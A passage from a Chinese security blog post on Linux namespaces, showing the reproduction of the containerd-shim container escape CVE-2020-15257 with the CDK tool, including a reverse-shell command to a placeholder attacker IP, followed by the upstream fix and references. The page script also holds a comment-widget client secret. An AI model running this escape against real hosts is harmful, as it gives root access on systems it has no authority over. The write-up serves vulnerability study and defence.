<p>在这两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>推荐阅读：<a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=837">CVE-2020-15257 EXP 开发</a> ，因为与 containerd-shim 通信与dockerd通信有点不一样，构造传参麻烦些，需要知道containerd-shim的入参</p>
<p>下面直接用集成至 cdk 的 exp 演示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --net=host --name=15257 ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p>在容器内执行命令cat /proc/net/unix|grep -a “containerd-shim”，查看结果确认是否可看到抽象命名空间Unix域套接字</p>
<p>在攻击端监听1234端口，然后下载漏洞利用工具CDK，并将其传入容器/tmp目录下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp cdk_linux_amd64 15257:/tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it 15257 bash</span><br></pre></td></tr></table></figure>

<p>运行工具，执行反弹shell命令,验证得到一个宿主机的shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">./cdk_linux_amd64 run shim-pwn reverse &lt;attacker-ip&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>

<p>注：关于该漏洞在利用时出现类似以下内容的问题，可以暂时参考<a target="_blank" rel="noopener" href="https://github.com/brant-ruan/metarget/issues/74">issue #74</a>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpc error: code = Unknown desc = OCI runtime create failed: <span class="built_in">exec</span>: <span class="string">&quot;runc&quot;</span>: executable file not found <span class="keyword">in</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/containerd/containerd/commit/4a4bb851f5da563ff6e68a83dc837c7699c469ad">https://github.com/containerd/containerd/commit/4a4bb851f5da563ff6e68a83dc837c7699c469ad</a></p>
<p>在最新发布的1.3.9和1.4.3版本中，抽象Unix域套接字已经改成了普通文件路径的Unix域套接字</p>
<p>因为containerd和containerd-shim都在容器外部，所以它们之间的连接、通信不受影响；因为有mnt命名空间的隔离，所以在host模式下，容器内部也无法访问普通文件路径的Unix域套接字。也就修复了上述漏洞。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linux_namespaces">https://en.wikipedia.org/wiki/Linux_namespaces</a></p>
<p>[2] <a target="_blank" rel="noopener" href="http://lwn.net/2001/0301/a/namespaces.php3">http://lwn.net/2001/0301/a/namespaces.php3</a></p>
<p>[3] <a target="_blank" rel="noopener" href="http://lwn.net/Articles/179345/">http://lwn.net/Articles/179345/</a></p>
<p>[4] <a target="_blank" rel="noopener" href="http://lwn.net/Articles/259217/">http://lwn.net/Articles/259217/</a></p>
<p>[5] <a target="_blank" rel="noopener" href="http://lwn.net/Articles/187274/">http://lwn.net/Articles/187274/</a></p>
<p>[6] <a target="_blank" rel="noopener" href="http://lwn.net/Articles/219794/">http://lwn.net/Articles/219794/</a></p>
<p>[7] <a target="_blank" rel="noopener" href="http://lwn.net/Articles/528078/">http://lwn.net/Articles/528078/</a></p>
<p>[8] <a target="_blank" rel="noopener" href="https://lkml.org/lkml/2016/3/18/564">https://lkml.org/lkml/2016/3/18/564</a></p>
<p>[9] <a target="_blank" rel="noopener" href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Time-Namespace-In-Linux-5.6">https://www.phoronix.com/scan.php?page=news_item&amp;px=Time-Namespace-In-Linux-5.6</a></p>
<p>[10] <a target="_blank" rel="noopener" href="https://www.quora.com/Is-it-possible-to-kill-the-init-process-in-Linux-by-the-kill-9-command">https://www.quora.com/Is-it-possible-to-kill-the-init-process-in-Linux-by-the-kill-9-command</a></p>
<p>[11] <a target="_blank" rel="noopener" href="https://blog.csdn.net/liumiaocn/article/details/52549196">https://blog.csdn.net/liumiaocn/article/details/52549196</a></p>
<p>[12] <a target="_blank" rel="noopener" href="https://lwn.net/Articles/531826/">https://lwn.net/Articles/531826/</a></p>
<p>[13] <a target="_blank" rel="noopener" href="https://coolshell.cn/articles/17010.html">https://coolshell.cn/articles/17010.html</a></p>
<p>[14] <a target="_blank" rel="noopener" href="https://coolshell.cn/articles/17029.html">https://coolshell.cn/articles/17029.html</a></p>
<p>[15] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/49F3eZ3ZWyp1V5irxBC20Q">https://mp.weixin.qq.com/s/49F3eZ3ZWyp1V5irxBC20Q</a></p>
<p>[16] <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000006917884">https://segmentfault.com/a/1190000006917884</a></p>
<p>[17] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sammyliu/p/5886833.html">https://www.cnblogs.com/sammyliu/p/5886833.html</a></p>
<p>[18] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA">https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA</a></p>
<p>[19] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sammyliu/category/882904.html">https://www.cnblogs.com/sammyliu/category/882904.html</a></p>
<p>[20] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WmSaLPnG4o4Co1xRiYCOnQ">https://mp.weixin.qq.com/s/WmSaLPnG4o4Co1xRiYCOnQ</a></p>
<p>[21] <a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=837">https://www.cdxy.me/?p=837</a></p>
<p>[22] <a target="_blank" rel="noopener" href="https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/">https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/</a></p>

  
  
    
    <div class='footer'>
      
      
      
        <div class='copyright'>
          <blockquote>
            
              
                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>

              
            
              
                <p>本文永久链接是：<a href=https://tari.moe/p/2022/linux-namespace/>https://tari.moe/p/2022/linux-namespace/</a></p>
              
            
          </blockquote>
        </div>
      
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>云安全</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Docker/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Docker</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Linux%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Linux命名空间</p></a></div>


        
      
    </div>
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/p/2023/CVE-2019-5736/'>
          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>runC容器逃逸-CVE-2019-5736复现</p>
          <p class='content'>漏洞环境环境部署
1./metarget cnv install cve-2019-5736



漏洞影响版本

runC &lt; 1.0-rc6 （docker &lt; 18.09.2）...</p>
        </a>
      
      
        <a class='next' href='/p/2022/cisp-pts/'>
          <p class='title'>CISP-PTS考证记<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>总结CISP-PTS 国家注册渗透测试专家 介绍可戳
先来总结一下考证经历，试题难度还是有的，不过因为是报班考的（也只能通过培训机构报），所以，很多题目都在平常练习中会有涉及，考前也会有一些特训...</p>
        </a>
      
    </div>
  
</article>


  

  <article class="post white-box reveal shadow" id="comments">
    <p ct><i class='fas fa-comments'></i> 评论</p>
    
    <div id="gitalk-container"></div>

  </article>






</div>
<aside class='l_side'>
  
  
    
    



  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
    
  <header>
    
      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>文档目录</span>
    
  </header>


    <div class='content'>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2"><span class="toc-text">历史</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A9%BA%E9%97%B4%E7%B1%BB%E5%9E%8B"><span class="toc-text">命令空间类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mnt%E9%9A%94%E7%A6%BB-11"><span class="toc-text">mnt隔离[11]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E9%9A%94%E7%A6%BB%E7%9A%84mount"><span class="toc-text">没有隔离的mount</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E9%9A%94%E7%A6%BB%E7%9A%84-mount"><span class="toc-text">有隔离的 mount</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C%E5%AE%9E%E7%8E%B0%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%9A%94%E7%A6%BB%E5%AE%9E%E9%AA%8C-13-14"><span class="toc-text">C实现命名空间隔离实验[13] [14]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#clone-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-text">clone()系统调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTS-Namespace"><span class="toc-text">UTS Namespace</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC-Mamespace"><span class="toc-text">IPC Mamespace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PID-Namespace"><span class="toc-text">PID Namespace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MNT-Namespace"><span class="toc-text">MNT Namespace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%8E%A9%E5%85%B7%E5%AE%B9%E5%99%A8"><span class="toc-text">一个玩具容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Namespace"><span class="toc-text">User Namespace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Network-Namespace"><span class="toc-text">Network Namespace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CGroups-Namespace-15"><span class="toc-text">CGroups Namespace[15]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E4%B8%AD%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%9A%94%E7%A6%BB%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-text">Docker中命名空间隔离的实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%9A%94%E7%A6%BB%E4%B8%8D%E5%BD%93%E6%BC%8F%E6%B4%9E-CVE-2020-15257"><span class="toc-text">命名空间隔离不当漏洞 CVE-2020-15257</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Unix%E5%A5%97%E6%8E%A5%E5%AD%97"><span class="toc-text">Unix套接字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F"><span class="toc-text">docker网络模式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
    </div>
  </section>


  


</aside>



		  
		  <!--此文件用来存放一些不方便取值的变量-->
<!--思路大概是将值藏到重加载的区域内-->

<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.postTitle="Linux命名空间机制及其隔离不当导致的漏洞";
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  // header 这里无论是否开启pjax都需要
  var l_header=document.getElementById("l_header");
  
  l_header.classList.add("show");
  
  
    // cover
    var cover_wrapper=document.querySelector('.cover-wrapper');
    
    cover_wrapper.id="none";
    cover_wrapper.style.display="none";
    
  
</script>

        </div>
        
  
  <footer class="footer clearfix">
    <br><br>
    
      
        本站使用
        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
        作为主题
      
    
      
        
          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
</div>
        
      
    
      
        
          <div><p>本站托管于 <a target="_blank" rel="noopener" href="https://pages.github.com/">Github Page</a> &amp;&amp; CDN 使用 <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">JSDELIVR</a></p>
</div>
        
      
    
      
        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
</div>
      
    
      
        <div class='copyright'>
        <p><a href="/">Copyright © 2019-2022 TARI TARI</a></p>

        </div>
      
    
  </footer>


        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
      </div>
    </div>
    <div>
      <script>
/************这个文件存放不需要重载的全局变量和全局函数*********/
window.volantis={};
window.volantis.loadcss=document.getElementById("loadcss");
/******************** Pjax ********************************/
function VPjax(){
	this.list=[] // 存放回调函数
	this.start=()=>{
	  for(var i=0;i<this.list.length;i++){
		this.list[i].run();
	  }
	}
	this.push=(fn,name)=>{
		var f=new PjaxItem(fn,name);
		this.list.push(f);
	}
	// 构造一个可以run的对象
	function PjaxItem(fn,name){
		// 函数名称
		this.name = name || fn.name
		// run方法
		this.run=()=>{
			fn()
		}
	}
}
volantis.pjax={}
volantis.pjax.method={
	complete: new VPjax(),
	error: new VPjax(),
	send: new VPjax()
}
volantis.pjax={
	...volantis.pjax,
	push: volantis.pjax.method.complete.push,
	error: volantis.pjax.method.error.push,
	send: volantis.pjax.method.send.push
}
/********************脚本懒加载函数********************************/
// 已经加入了setTimeout
function loadScript(src, cb) {
	setTimeout(function() {
		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
		var script = document.createElement('script');
		script.setAttribute('type','text/javascript');
		if (cb) script.onload = cb;
		script.setAttribute('src', src);
		HEAD.appendChild(script);
	});
}
//https://github.com/filamentgroup/loadCSS
var loadCSS = function( href, before, media, attributes ){
	var doc = window.document;
	var ss = doc.createElement( "link" );
	var ref;
	if( before ){
		ref = before;
	}
	else {
		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
		ref = refs[ refs.length - 1];
	}
	var sheets = doc.styleSheets;
	if( attributes ){
		for( var attributeName in attributes ){
			if( attributes.hasOwnProperty( attributeName ) ){
				ss.setAttribute( attributeName, attributes[attributeName] );
			}
		}
	}
	ss.rel = "stylesheet";
	ss.href = href;
	ss.media = "only x";
	function ready( cb ){
		if( doc.body ){
			return cb();
		}
		setTimeout(function(){
			ready( cb );
		});
	}
	ready( function(){
		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
	});
	var onloadcssdefined = function( cb ){
		var resolvedHref = ss.href;
		var i = sheets.length;
		while( i-- ){
			if( sheets[ i ].href === resolvedHref ){
				return cb();
			}
		}
		setTimeout(function() {
			onloadcssdefined( cb );
		});
	};
	function loadCB(){
		if( ss.addEventListener ){
			ss.removeEventListener( "load", loadCB );
		}
		ss.media = media || "all";
	}
	if( ss.addEventListener ){
		ss.addEventListener( "load", loadCB);
	}
	ss.onloadcssdefined = onloadcssdefined;
	onloadcssdefined( loadCB );
	return ss;
};
</script>
<script>
  
  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
  
  
  
  
</script>
<!-- required -->

<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>

<script>
  function pjax_fancybox() {
    $(".md .gallery").find("img").each(function () { //渲染 fancybox
      var element = document.createElement("a"); // a 标签
      $(element).attr("class", "fancybox");
      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
      $(element).attr("href", $(this).attr("src"));
      if ($(this).attr("data-original")) {
        $(element).attr("href", $(this).attr("data-original"));
      }
      $(element).attr("data-fancybox", "images");
      var caption = "";   // 描述信息
      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
        $(element).attr('data-caption', $(this).attr('alt'));
        caption = $(this).attr('alt');
      }
      var div = document.createElement("div");
      $(div).addClass("fancybox");
      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
      var span = document.createElement("span");
      $(span).addClass("image-caption");
      $(span).text(caption); // 加描述
      $(this).after(span);  // 再套一层描述
      $(this).wrap(element);  // 最后套 a 标签
    })
    $(".md .gallery").find("img").fancybox({
      selector: '[data-fancybox="images"]',
      hash: false,
      loop: false,
      closeClick: true,
      helpers: {
        overlay: {closeClick: true}
      },
      buttons: [
        "zoom",
        "close"
      ]
    });
  };
  function SCload_fancybox() {
    if ($(".md .gallery").find("img").length == 0) return;
    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
  };
  $(function () {
    SCload_fancybox();
  });
  function Pjax_SCload_fancybox(){
	if (typeof $.fancybox == "undefined") {
	 SCload_fancybox();
    } else {
	 pjax_fancybox();
    }
  }
  volantis.pjax.push(Pjax_SCload_fancybox)
  volantis.pjax.send(()=>{
      if (typeof $.fancybox != "undefined") {
        $.fancybox.close();    // 关闭弹窗
      }
  },'fancybox')
</script>


<!-- internal -->




<script>
  function loadIssuesJS() {
    if ($(".md").find(".issues-api").length == 0) return;
	
	  loadScript('/js/issues.js');
	
  };
  $(function () {
    loadIssuesJS();
  });
  volantis.pjax.push(()=>{
	if (typeof IssuesAPI == "undefined") {
	  loadIssuesJS();
	}
  },"IssuesJS")
</script>



  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
  document.addEventListener('pjax:complete', function () {
    lazyLoadInstance.update();
  });
</script>




  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: [],
	maxRPS: 5,
	hoverDelay: 25
  };
</script>
<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>











  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script type="text/javascript">
  function pjax_gitalk() {
    if(!document.querySelectorAll("#gitalk-container")[0])return;
    let path = pdata.commentPath;
    if (path.length == 0) {
      let defaultPath = '';
      path = defaultPath || decodeURI(window.location.pathname);
    }
    if (document.getElementById('gitalk-container') != null) {
      var gitalk = new Gitalk(Object.assign({"clientID":"71041770cc5d77158add","clientSecret":"e6825eb932dd754c2690903ffea01232bf0fc87f","repo":"tarimoe.github.io","owner":"tarimoe","admin":["tarimoe"],"path":null}, {
	  id: path,
	  distractionFreeMode: false  // Facebook-like distraction free mode
    }));
      gitalk.render('gitalk-container');
    }
  }
  $(function () {
    pjax_gitalk();
  });
  volantis.pjax.push(pjax_gitalk);
</script>






  
<script src="/js/app.js"></script>



<!-- optional -->

  <script>
const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );

$('.input.u-search-input').one('focus',function(){
	
		loadScript('/js/search/hexo.js',setSearchService);
	
})

function listenSearch(){
  
    customSearch = new HexoSearch({
      imagePath: SearchServiceimagePath
    });
  
}
function setSearchService() {
	listenSearch();
	
}
</script>











  <script defer>

  const LCCounter = {
    app_id: 'drHoUTNkw1UylDdn7MwkAry5-MdYXbMMI',
    app_key: 'JgkgW3M15DEOEujk1nYGmmIx',
    custom_api_server: '',

    // 查询存储的记录
    getRecord(Counter, url, title) {
      return new Promise(function (resolve, reject) {
        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
          .then(resp => resp.json())
          .then(({results, code, error}) => {
            if (code === 401) {
              throw error;
            }
            if (results && results.length > 0) {
              var record = results[0];
              resolve(record);
            } else {
              Counter('post', '/classes/Counter', {url, title: title, times: 0})
                .then(resp => resp.json())
                .then((record, error) => {
                  if (error) {
                    throw error;
                  }
                  resolve(record);
                }).catch(error => {
                console.error('Failed to create', error);
                reject(error);
              });
            }
          }).catch((error) => {
          console.error('LeanCloud Counter Error:', error);
          reject(error);
        });
      })
    },

    // 发起自增请求
    increment(Counter, incrArr) {
      return new Promise(function (resolve, reject) {
        Counter('post', '/batch', {
          "requests": incrArr
        }).then((res) => {
          res = res.json();
          if (res.error) {
            throw res.error;
          }
          resolve(res);
        }).catch((error) => {
          console.error('Failed to save visitor count', error);
          reject(error);
        });
      });
    },

    // 构建自增请求体
    buildIncrement(objectId) {
      return {
        "method": "PUT",
        "path": `/1.1/classes/Counter/${ objectId }`,
        "body": {
          "times": {
            '__op': 'Increment',
            'amount': 1
          }
        }
      }
    },

    // 校验是否为有效的 UV
    validUV() {
      var key = 'LeanCloudUVTimestamp';
      var flag = localStorage.getItem(key);
      if (flag) {
        // 距离标记小于 24 小时则不计为 UV
        if (new Date().getTime() - parseInt(flag) <= 86400000) {
          return false;
        }
      }
      localStorage.setItem(key, new Date().getTime().toString());
      return true;
    },

    addCount(Counter) {
      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
      enableIncr = true;
      var getterArr = [];
      var incrArr = [];
      // 请求 PV 并自增
      var pvCtn = document.querySelector('#lc-sv');
      if (pvCtn || enableIncr) {
        var pvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-sv', 'Visits').then((record) => {
          incrArr.push(this.buildIncrement(record.objectId))
          var eles = document.querySelectorAll('#lc-sv #number');
          if (eles.length > 0) {
            eles.forEach((el,index,array)=>{
              el.innerText = record.times + 1;
              if (pvCtn) {
                pvCtn.style.display = 'inline';
              }
            })
          }
        });
        getterArr.push(pvGetter);
      }

      // 请求 UV 并自增
      var uvCtn = document.querySelector('#lc-uv');
      if (uvCtn || enableIncr) {
        var uvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-uv', 'Visitors').then((record) => {
          var vuv = this.validUV();
          vuv && incrArr.push(this.buildIncrement(record.objectId))
          var eles = document.querySelectorAll('#lc-uv #number');
          if (eles.length > 0) {
            eles.forEach((el,index,array)=>{
              el.innerText = record.times + (vuv ? 1 : 0);
              if (uvCtn) {
                uvCtn.style.display = 'inline';
              }
            })
          }
        });
        getterArr.push(uvGetter);
      }

      // 请求文章的浏览数，如果是当前页面就自增
      var allPV = document.querySelectorAll('#lc-pv');
      if (allPV.length > 0 || enableIncr) {
        for (i = 0; i < allPV.length; i++) {
          let pv = allPV[i];
          let title = pv.getAttribute('data-title');
          var url = 'https://tari.moe' + pv.getAttribute('data-path');
          if (url) {
            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
              // 是当前页面就自增
              let curPath = window.location.pathname;
              if (curPath.includes('index.html')) {
                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
              }
              if (pv.getAttribute('data-path') == curPath) {
                incrArr.push(this.buildIncrement(record.objectId));
              }
              if (pv) {
                var ele = pv.querySelector('#lc-pv #number');
                if (ele) {
                  if (pv.getAttribute('data-path') == curPath) {
                    ele.innerText = (record.times || 0) + 1;
                  } else {
                    ele.innerText = record.times || 0;
                  }
                  pv.style.display = 'inline';
                }
              }
            });
            getterArr.push(viewGetter);
          }
        }
      }

      // 如果启动计数自增，批量发起自增请求
      if (enableIncr) {
        Promise.all(getterArr).then(() => {
          incrArr.length > 0 && this.increment(Counter, incrArr);
        })
      }

    },


    fetchData(api_server) {
      var Counter = (method, url, data) => {
        return fetch(`${ api_server }/1.1${ url }`, {
          method,
          headers: {
            'X-LC-Id': this.app_id,
            'X-LC-Key': this.app_key,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      this.addCount(Counter);
    },

    refreshCounter() {
      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
      if (api_server) {
        this.fetchData(api_server);
      } else {
        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
          .then(resp => resp.json())
          .then(({api_server}) => {
            this.fetchData('https://' + api_server);
          });
      }
    }

  };

  LCCounter.refreshCounter();

  document.addEventListener('pjax:complete', function () {
    LCCounter.refreshCounter();
  });
</script>




  <script>
const rootElement = document.documentElement;
const darkModeStorageKey = "user-color-scheme";
const rootElementDarkModeAttributeName = "data-user-color-scheme";

const setLS = (k, v) => {
    localStorage.setItem(k, v);
};

const removeLS = (k) => {
    localStorage.removeItem(k);
};

const getLS = (k) => {
    return localStorage.getItem(k);
};

const getModeFromCSSMediaQuery = () => {
  return window.matchMedia("(prefers-color-scheme: dark)").matches
    ? "dark"
    : "light";
};

const resetRootDarkModeAttributeAndLS = () => {
  rootElement.removeAttribute(rootElementDarkModeAttributeName);
  removeLS(darkModeStorageKey);
};

const validColorModeKeys = {
  dark: true,
  light: true,
};

const applyCustomDarkModeSettings = (mode) => {
  const currentSetting = mode || getLS(darkModeStorageKey);

  if (currentSetting === getModeFromCSSMediaQuery()) {
    resetRootDarkModeAttributeAndLS();
  } else if (validColorModeKeys[currentSetting]) {
    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
  } else {
    resetRootDarkModeAttributeAndLS();
  }
};

const invertDarkModeObj = {
  dark: "light",
  light: "dark",
};

/**
 * get target mode
 */
const toggleCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);

  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  setLS(darkModeStorageKey, currentSetting);
  return currentSetting;
};

/**
 * bind click event for toggle button
 */
var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
function bindToggleButton() {
    btn.on('click',(e) => {
      const mode = toggleCustomDarkMode();
      applyCustomDarkModeSettings(mode);
    });
}

applyCustomDarkModeSettings();
document.addEventListener("DOMContentLoaded", bindToggleButton);
volantis.pjax.push(bindToggleButton);
volantis.pjax.send(()=>{
	btn.unbind('click');
},'toggle-mode-btn-unbind');
</script>








<script>
function listennSidebarTOC() {
  const navItems = document.querySelectorAll(".toc li");
  if (!navItems.length) return;
  const sections = [...navItems].map((element) => {
    const link = element.querySelector(".toc-link");
    const target = document.getElementById(
      decodeURI(link.getAttribute("href")).replace("#", "")
    );
    link.addEventListener("click", (event) => {
      event.preventDefault();
      window.scrollTo({
		top: target.offsetTop + 100,
		
		behavior: "smooth"
		
	  });
    });
    return target;
  });

  function activateNavByIndex(target) {
    if (target.classList.contains("active-current")) return;

    document.querySelectorAll(".toc .active").forEach((element) => {
      element.classList.remove("active", "active-current");
    });
    target.classList.add("active", "active-current");
    let parent = target.parentNode;
    while (!parent.matches(".toc")) {
      if (parent.matches("li")) parent.classList.add("active");
      parent = parent.parentNode;
    }
  }

  function findIndex(entries) {
    let index = 0;
    let entry = entries[index];
    if (entry.boundingClientRect.top > 0) {
      index = sections.indexOf(entry.target);
      return index === 0 ? 0 : index - 1;
    }
    for (; index < entries.length; index++) {
      if (entries[index].boundingClientRect.top <= 0) {
